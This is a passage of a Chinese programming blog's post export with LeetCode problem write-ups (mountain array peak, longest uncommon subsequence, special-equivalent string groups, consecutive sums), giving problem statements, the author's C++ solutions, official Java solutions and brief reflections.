<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/peak-index-in-a-mountain-array/solution/shan-mai-shu-zu-de-feng-ding-suo-yin-by-leetcode/">官方题解</a>:</h6><p><strong>方法一：线性扫描</strong></p>
<p><strong>思路和算法</strong></p>
<p>从左往右扫描直到山的高度不再增长为止，停止增长点就是峰顶。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peakIndexInMountainArray</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (A[i] &lt; A[i+<span class="number">1</span>]) i++;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 N是 <code>A</code> 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法二：二分查找</strong></p>
<p><strong>思路和算法</strong></p>
<p>将山脉数组中所有满足 <code>A[i] &lt; A[i+1]</code> 的 <code>i</code> 点标记为 <code>True</code>，不满足的点标记为 <code>False</code>。则一个山脉数组可以标记为：<code>[True, True, True, ..., True, False, False, ..., False]</code>。例如山脉数组 <code>[1, 2, 3, 4, 1]</code> 可以标记为 <code>True, True, True, False</code>。</p>
<p>在山脉数组上使用二分查找，找出满足 <code>A[i] &lt; A[i+1]</code> 的最大 <code>i</code>。更多关于 二分查找 的知识，请访问 <a href="https://leetcode-cn.com/explore/learn/card/binary-search/">Leetcode 探索</a>。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peakIndexInMountainArray</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> lo = <span class="number">0</span>, hi = A.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">            <span class="keyword">int</span> mi = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (A[mi] &lt; A[mi + <span class="number">1</span>])</span><br><span class="line">                lo = mi + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                hi = mi;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(\log N)$，其中 $N$ 是 <code>A</code> 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解提供了线性扫描和二分查找两种思路，线性扫描效率要高一些，二分查找也不失为一种方法。注意有的时候where循环比for循环更合适，注意where循环、for循环乃至do…while循环的使用条件。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>最长特殊序列I</title>
    <url>/2020/11/26/%E6%9C%80%E9%95%BF%E7%89%B9%E6%AE%8A%E5%BA%8F%E5%88%97I/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/longest-uncommon-subsequence-i/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个字符串，请你从这两个字符串中找出最长的特殊序列。</p>
<p>「最长特殊序列」定义如下：该序列为某字符串独有的最长子序列（即不能是其他字符串的子序列）。</p>
<p><strong>子序列</strong> 可以通过删去字符串中的某些字符实现，但不能改变剩余字符的相对顺序。空序列为所有字符串的子序列，任何字符串为其自身的子序列。</p>
<p>输入为两个字符串，输出最长特殊序列的长度。如果不存在，则返回 -1。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;aba&quot;, &quot;cdc&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 最长特殊序列可为 &quot;aba&quot; (或 &quot;cdc&quot;)，两者均为自身的子序列且不是对方的子序列。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：a &#x3D; &quot;aaa&quot;, b &#x3D; &quot;bbb&quot;</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：a &#x3D; &quot;aaa&quot;, b &#x3D; &quot;aaa&quot;</span><br><span class="line">输出：-1</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li>两个字符串长度均处于区间 <code>[1 - 100]</code> 。</li>
<li>字符串中的字符仅含有 <code>&#39;a&#39;~&#39;z&#39;</code> 。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>求两个最长特殊序列的长度，乍一看好像有点难。其实仔细分析一下也挺简单的：</p>
<p>两个字符串长度分别为la,lb</p>
<ul>
<li>若la\==lb,再判断字符串a是否等于b，若a\==b不存在特殊序列返回-1；若a!=b则两个字符串自身就是特殊序列，返回la。</li>
<li>若la!=lb，则长度最大的那个字符串本身就是特殊序列且长度最长，返回max(la,lb)。</li>
</ul>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.4M，击败17.49%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLUSlength</span><span class="params">(<span class="built_in">string</span> a, <span class="built_in">string</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> la=a.length(),lb=b.length();</span><br><span class="line">        <span class="keyword">if</span>(la==lb)&#123;</span><br><span class="line">            <span class="keyword">return</span> a==b?<span class="number">-1</span>:la;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> la&gt;lb?la:lb;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/longest-uncommon-subsequence-i/solution/zui-chang-te-shu-xu-lie-i-by-leetcode/">官方题解</a>:</h6><p><strong>方法一：暴力解法 【超出时间限制】</strong><br>暴力解法中，生成两个字符串所有的子序列共 $2^n$ 个，将其存储在 hashmap 中，并记录每个子序列出现的次数。然后找出出现次数为 $1$ 的最长子序列。如果不存在这样的子序列，返回 $-1$</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findLUSlength</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">        HashMap &lt; String, Integer &gt; map = <span class="keyword">new</span> HashMap &lt; &gt; ();</span><br><span class="line">        <span class="keyword">for</span> (String s: <span class="keyword">new</span> String[] &#123;a, b&#125;) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; s.length()); i++) &#123;</span><br><span class="line">                String t = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; s.length(); j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (((i &gt;&gt; j) &amp; <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">                        t += s.charAt(j);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (map.containsKey(t))</span><br><span class="line">                    map.put(t, map.get(t) + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    map.put(t, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (String s: map.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(s) == <span class="number">1</span>)</span><br><span class="line">                res = Math.max(res, s.length());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(2^x+2^y)$，其中 x和 y 是字符串 a 和 b 的长度，子序列的数量为 $2^x+2^y$ 。</p>
</li>
<li><p>空间复杂度：$O(2^x+2^y)$，共生成 $2^x+2^y$个子序列。</p>
</li>
</ul>
<p><strong>方法二：简单解法 【通过】</strong></p>
<p><strong>算法</strong></p>
<p>字符串 $a$ 和 $b$ 共有 3 种情况：</p>
<ul>
<li><p>$a=b$。如果两个字符串相同，则没有特殊子序列，返回 -1。</p>
</li>
<li><p>$length(a)=length(b)$且 $a \ne b$。例如：$abc$ 和 $abd$。这种情况下，一个字符串一定不会是另外一个字符串的子序列，因此可以将任意一个字符串看作是特殊子序列，返回 $length(a)$ 或 $length(b)$。</p>
</li>
<li><p>$length(a) \ne length(b)$。例如：$abcd$ 和 $abc$。这种情况下，长的字符串一定不会是短字符串的子序列，因此可以将长字符串看作是特殊子序列，返回 $max(length(a),length(b))$。</p>
</li>
</ul>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findLUSlength</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a.equals(b))</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> Math.max(a.length(), b.length());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(min(x,y))$，其中 $x$ 和 $y$ 是字符串 a 和 b 的长度。方法 equals 的时间复杂度为 min(x,y)。</p>
</li>
<li><p>空间复杂度：O(1)，无需额外空间。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解方法二和我的思路一样，方法一暴力求解没戏。题目也比较简单，只是注意要考虑好所有的情况。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>特殊等价字符串组</title>
    <url>/2020/11/26/%E7%89%B9%E6%AE%8A%E7%AD%89%E4%BB%B7%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/groups-of-special-equivalent-strings/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>你将得到一个字符串数组 <code>A</code>。</p>
<p>每次移动都可以交换 S 的任意两个偶数下标的字符或任意两个奇数下标的字符。</p>
<p>如果经过任意次数的移动，S == T，那么两个字符串 <code>S</code> 和 <code>T</code> 是 特殊等价 的。</p>
<p>例如，<code>S = &quot;zzxy&quot;</code> 和 <code>T = &quot;xyzz&quot;</code> 是一对特殊等价字符串，因为可以先交换 <code>S[0]</code> 和 <code>S[2]</code>，然后交换 <code>S[1]</code> 和 <code>S[3]</code>，使得 <code>&quot;zzxy&quot; -&gt; &quot;xzzy&quot; -&gt; &quot;xyzz&quot;</code> 。</p>
<p>现在规定，<code>A</code> 的 <strong>一组特殊等价字符串</strong> 就是 <code>A</code> 的一个同时满足下述条件的非空子集：</p>
<ol>
<li>该组中的每一对字符串都是 <strong>特殊等价</strong> 的</li>
<li>该组字符串已经涵盖了该类别中的所有特殊等价字符串，容量达到理论上的最大值（也就是说，如果一个字符串不在该组中，那么这个字符串就 <strong>不会</strong> 与该组内任何字符串特殊等价）<br>返回 <code>A</code> 中特殊等价字符串组的数量。</li>
</ol>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;abcd&quot;,&quot;cdab&quot;,&quot;cbad&quot;,&quot;xyzz&quot;,&quot;zzxy&quot;,&quot;zzyx&quot;]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">其中一组为 [&quot;abcd&quot;, &quot;cdab&quot;, &quot;cbad&quot;]，因为它们是成对的特殊等价字符串，且没有其他字符串与这些字符串特殊等价。</span><br><span class="line">另外两组分别是 [&quot;xyzz&quot;, &quot;zzxy&quot;] 和 [&quot;zzyx&quot;]。特别需要注意的是，&quot;zzxy&quot; 不与 &quot;zzyx&quot; 特殊等价。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;abc&quot;,&quot;acb&quot;,&quot;bac&quot;,&quot;bca&quot;,&quot;cab&quot;,&quot;cba&quot;]</span><br><span class="line">输出：3</span><br><span class="line">解释：3 组 [&quot;abc&quot;,&quot;cba&quot;]，[&quot;acb&quot;,&quot;bca&quot;]，[&quot;bac&quot;,&quot;cab&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= A.length &lt;= 1000</code></li>
<li><code>1 &lt;= A[i].length &lt;= 20</code></li>
<li>所有 <code>A[i]</code> 都具有相同的长度。</li>
<li>所有 <code>A[i]</code> 都只由小写字母组成。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>读完题目后觉得这道题还挺难的，就在脑子里多想一想，还是被我想到了，哈哈哈😁</p>
<p>要求字符串数组A中特殊等价字符串组的数量，注意到一组特殊等价字符串是交换偶数下标字符和奇数下标字符得到的，那么他们都可以转换成同一个字符串，只要对数组A中的每个字符串分别按奇数下标、偶数下标排序，然后再求它们找那个不同字符串的数量就好了，最后一步可以利用set集合无序不可重复的特性。现在就变成怎么把字符串分别按照奇数下标和偶数下标排序。</p>
<p>sort()函数好像没有步长，不能自定义排序规则，所以需要自己实现了，对字符串考虑把偶数位置的元素放在前面，奇数位置的元素放在后面，然后调用sort函数对前半部分和后半部分分别排序，排序后的字符串就是特殊等价字符串，放入set集合中，最后返回set集合的长度（一组特殊等价字符串只存储了一个，所以长度就是特殊等价字符串组的数量）。</p>
<p>也可以分别把字符串中的偶数位置、奇数位置字符提取出来然后排序最后拼接放入到set集合中。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败95.61%，内存消耗8.7M，击败35.84%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numSpecialEquivGroups</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n=A[<span class="number">0</span>].length();</span><br><span class="line">        <span class="comment">//set集合无序不可重复,存储A的特殊等价字符串</span></span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="built_in">string</span>&gt; equal_s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">string</span> s:A)&#123;</span><br><span class="line">            <span class="comment">//双指针排序</span></span><br><span class="line">            <span class="comment">//前半部分索引i表示，后半部分索引tmp，把前半部分奇数下标位置和后半部分偶数下标部分交换</span></span><br><span class="line">            <span class="keyword">int</span> tmp=(n+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">            <span class="comment">//若后半部分开始索引是奇数，则tmp加1得到开始的偶数下标</span></span><br><span class="line">            <span class="keyword">if</span>(tmp%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                ++tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;(n+<span class="number">1</span>)/<span class="number">2</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="comment">//奇偶位置分别排序，偶数位置元素在前</span></span><br><span class="line">                swap(s[i],s[tmp]);</span><br><span class="line">                tmp+=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对前半部分（偶数位置元素）排序</span></span><br><span class="line">            sort(s.begin(),s.begin()+(n+<span class="number">1</span>)/<span class="number">2</span>);</span><br><span class="line">            <span class="comment">//对后半部分（奇数位置元素）排序</span></span><br><span class="line">            sort(s.begin()+(n+<span class="number">1</span>)/<span class="number">2</span>,s.end());</span><br><span class="line">            equal_s.insert(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> equal_s.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/groups-of-special-equivalent-strings/solution/te-shu-deng-jie-zi-fu-chuan-zu-by-leetcode/">官方题解</a>:</h6><p><strong>方法：计数</strong></p>
<p><strong>思路和算法</strong></p>
<p>让我们试着表述一个特殊等价的字符串 $S$，通过找到函数 $\mathcal{C}$ 使得 $S \equiv T \iff \mathcal{C}(S) = \mathcal{C}(T)$。</p>
<p>通过交换，我们可以排列偶数索引字母和奇数索引字母。这些排列的特征在于字母的数量：所有这样的排列都有相同的数量，不同的数量会产生不同的排列。</p>
<p>因此，函数 $\mathcal{C}(S) =$（S 中偶数索引字母的数量，其后是 S 中奇数索引字母的数量）成功地刻画了这一等价关系。</p>
<p>然后，我们统计出满足 $S \in A$ 的 $\mathcal{C}(S)$ 的数量。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSpecialEquivGroups</span><span class="params">(String[] A)</span> </span>&#123;</span><br><span class="line">        Set&lt;String&gt; seen = <span class="keyword">new</span> HashSet();</span><br><span class="line">        <span class="keyword">for</span> (String S: A) &#123;</span><br><span class="line">            <span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">52</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S.length(); ++i)</span><br><span class="line">                count[S.charAt(i) - <span class="string">&#x27;a&#x27;</span> + <span class="number">26</span> * (i % <span class="number">2</span>)]++;</span><br><span class="line">            seen.add(Arrays.toString(count));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> seen.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(\sum\limits_{i} (A_i)\text{.length})$。</p>
</li>
<li><p>空间复杂度：$O(N)$，其中 $N$ 是 <code>A</code> 的长度。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解虽然和我的思路不太一样，但本质是一样的都是找到一组等价字符串的等价关系，然后转换成一致的最后统计数量。等价字符串是通过交换偶数下标字符或奇数下标字符得到的，我是采用了一组等价字符串中的每个字符串必然可以通过排序转换成一个相同的字符串形式，也就是奇数下标、偶数下标字符分别排序，以下列输入为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;abcd&quot;,&quot;cdab&quot;,&quot;cbad&quot;,&quot;xyzz&quot;,&quot;zzxy&quot;,&quot;zzyx&quot;]</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<p>每个字符串通过排序可以转换成如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“abcd”&#x3D;》“acbd”</span><br><span class="line"></span><br><span class="line">“cdab”&#x3D;》“acbd”</span><br><span class="line"></span><br><span class="line">“cbad”&#x3D;》“acbd”</span><br><span class="line"></span><br><span class="line">“xyzz”&#x3D;》“xzyz”</span><br><span class="line"></span><br><span class="line">“zzxy”&#x3D;》“xzyz”</span><br><span class="line"></span><br><span class="line">“zzyx“&#x3D;》”yzxz“</span><br></pre></td></tr></table></figure>
<p>根据转换后的结果可以看到前三个字符串相同是一组特殊等价字符串、中间两个一组、最后一个一组所以特殊等价字符串的数量为3，即输出为3。</p>
<p><strong>计数法：</strong></p>
<p>其实不通过奇数位置、偶数位置分别排序也可以求解，<strong>奇数位置、偶数位置排序后字符串相等《=》原字符串奇数位置各字母数量、偶数位置各字母数量相等</strong>，这两者是等价的。官方题解就是通过这个等价的转换求解的。对字符串数组A中的每个字符串用大小为52的int数组count存储该字符串的奇偶位置字母数量，前26个存储偶数下标字母数量、后26个存储奇数下标字母数量，最后数组转成字符串放入set集合中，因为一组特殊等价字符串中的字符串有字母数量转换后的字符串相等，所以最后set集合的大小就是A中特殊等价字符串组的数量。</p>
<p>这道题还挺好的，不是那么简单，还行😌</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>和为s的连续正数序列</title>
    <url>/2020/11/27/%E5%92%8C%E4%B8%BAs%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%AD%A3%E6%95%B0%E5%BA%8F%E5%88%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/he-wei-sde-lian-xu-zheng-shu-xu-lie-lcof/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>输入一个正整数 <code>target</code> ，输出所有和为 <code>target</code> 的连续正整数序列（至少含有两个数）。</p>
<p>序列内的数字由小到大排列，不同序列按照首个数字从小到大排列。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; 9</span><br><span class="line">输出：[[2,3,4],[4,5]]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; 15</span><br><span class="line">输出：[[1,2,3,4,5],[4,5,6],[7,8]]</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= target &lt;= 10^5</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历所有可能的首个数字i，首数字范围是$[1，\frac{target}{2}]$,对每个首数字开始的连续正整数序列累加判断能否找到和为target的。如果存在则形成以数字i开始的和为target的连续正整数序列并存到结果集中。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败66.56%，内存消耗7M，击败23.15%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">findContinuousSequence</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        <span class="comment">//遍历所有可能的首个数字</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=target/<span class="number">2</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> j=i;</span><br><span class="line">            <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(sum&lt;target)&#123;</span><br><span class="line">                sum+=j;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(sum==target)&#123;</span><br><span class="line">                tmp.clear();</span><br><span class="line">                <span class="comment">//形成和为target的连续正整数序列</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=i;k&lt;j;++k)&#123;</span><br><span class="line">                    tmp.emplace_back(k);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//放入结果集中</span></span><br><span class="line">                result.emplace_back(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

